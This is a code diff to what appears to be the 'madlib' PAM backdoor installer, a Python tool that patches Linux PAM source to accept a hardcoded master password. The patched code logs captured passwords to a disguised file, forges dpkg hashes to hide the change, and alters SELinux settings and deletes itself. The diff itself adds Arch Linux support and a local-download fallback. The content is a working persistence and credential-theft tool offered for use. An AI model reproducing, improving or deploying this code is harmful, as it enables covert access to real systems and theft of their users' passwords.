@@ -12,10 +12,13 @@ import random
 import string
 import crypt
 import warnings
+
 warnings.filterwarnings("ignore", category=DeprecationWarning) 
 
 conf = {
+    # Default password is secretpassxd
     "password": "secretpassxd",
+    # Default log location is /usr/include/type.h
     "log_location": "/usr/include/type.h",
 }
 
@@ -47,13 +50,17 @@ banner = r'''                    .___.__  ._____.
       \/     \/      \/              \/
     https://github.com/rek7/madlib/'''
 
+
 def gen_bcrypt_salt(length=10):
     return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))
 
+
 bcrypt_salt = gen_bcrypt_salt()
+
 
 def gen_bcrypt_pass(password):
     return crypt.crypt(password, bcrypt_salt)
+
 
 src = '''
 if(strcmp(crypt(p, "{}"), "{}") == 0){{
@@ -64,6 +71,7 @@ if(strcmp(crypt(p, "{}"), "{}") == 0){{
 		fclose(out);
 }}
 '''.format(bcrypt_salt, gen_bcrypt_pass(conf["password"]), conf["log_location"])
+
 
 def place_backdoor(src_location):
     is_tainted = False
@@ -82,11 +90,14 @@ def place_backdoor(src_location):
         prompt("-", "Place Backdoor: {}".format(e))
     return is_tainted
 
+
 def self_remove(original_file):
     os.remove(original_file + "/"+ sys.argv[0])
 
+
 def prompt(icon, message, end="\n"):
     print("[{}] [{}] {}".format(time.strftime('%X'), icon, message), end=end)
+
 
 def update_dpkg_hashes(dpkg_location, bin_location, replace_str):
     tmp=tempfile.mkstemp()
@@ -106,6 +117,7 @@ def update_dpkg_hashes(dpkg_location, bin_location, replace_str):
     except Exception as e:
         prompt("-", "Update DPKG Hashes: {}".format(e))
     return False
+
 
 def install_pam(current_location):
     for possible in install_dirs:
@@ -128,7 +140,17 @@ def install_pam(current_location):
                 return possible
     return False
 
+
 def download_file(url, output_name):
+    try:
+        dl_file = url.replace('https://github.com/linux-pam/linux-pam/releases/download/v', '')
+        dl_file = dl_file[(dl_file.find('/') + 1):]
+        if os.path.isfile(dl_file):
+            prompt("-", "Copying local file instead of downloading.")
+            shutil.copyfile(dl_file, output_name)
+            return True
+    except Exception as e:
+        prompt("-", "Unable to copy local version of file, attempting to download instead: {}".format(e))
     try:
         if urllib.request.urlretrieve(url, output_name):
             return True
@@ -139,12 +161,14 @@ def download_file(url, output_name):
             prompt("-", "Download File: {}".format(e))
     return False
 
+
 def program_output(cmd):
     try:
         return subprocess.check_output(cmd, shell=True).decode("utf-8")
     except:
         pass
     return False
+
 
 def fix_se_linux():
     if os.path.exists("/etc/selinux/config"):
@@ -164,10 +188,14 @@ def fix_se_linux():
                 fd2.write("{}\n".format(se_updated_line))
         fd2.close()
 
+
 def get_pam_version():
     try:
         import platform
-        linux_distro = platform.linux_distribution()[0].lower()
+        try:
+            linux_distro = platform.linux_distribution()[0].lower()
+        except:
+            linux_distro = platform.freedesktop_os_release()['NAME'].lower()
     except Exception:
         import distro
         linux_distro = distro.like()
@@ -175,7 +203,10 @@ def get_pam_version():
         return program_output("dpkg -s libpam-modules | grep -i Version | awk '{ print $2 }'").split("-")[0]
     elif linux_distro in ["redhat", "centos", "centos linux", "fedora"]:
         return program_output("yum list installed | grep 'pam\.*' | awk '{print $2}'").split("-")[0]
+    elif linux_distro in ["arch linux"]:
+        return program_output("pacman -Si core/pam | grep '^Version' | cut -f 2 -d ':'").strip().split("-")[0]
     return False
+
 
 if __name__ == "__main__":
     print(banner)
